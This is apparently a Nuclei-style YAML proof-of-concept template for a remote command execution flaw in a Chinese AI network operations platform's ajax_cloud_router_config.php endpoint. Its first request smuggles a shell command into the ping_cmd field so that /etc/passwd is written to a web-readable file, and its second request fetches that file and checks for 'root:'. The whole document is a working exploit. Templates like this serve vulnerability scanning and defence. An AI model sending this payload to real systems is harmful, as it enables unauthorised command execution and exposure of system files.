id: poc-yaml-tg-holographic-ai-ajax-cloud-router-config-rce
info:
  name: 全息AI网络运维平台 ajax_cloud_router_config.php 命令执行漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce

variables:
  t1: '{{rand_base(4)}}'

http:
  - id: first-request
    method: POST
    path:
      - "{{BaseURL}}/nmss/cloud/Ajax/ajax_cloud_router_config.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "ping_cmd=8.8.8.8|cat /etc/passwd>{{t1}}.txt"
    matchers:
      - type: status
        status:
          - 200

  - id: second-request
    method: GET
    path:
      - "{{BaseURL}}/nmss/cloud/Ajax/{{t1}}.txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin"
      - type: word
        words:
          - "<"
        negative: true
        part: body
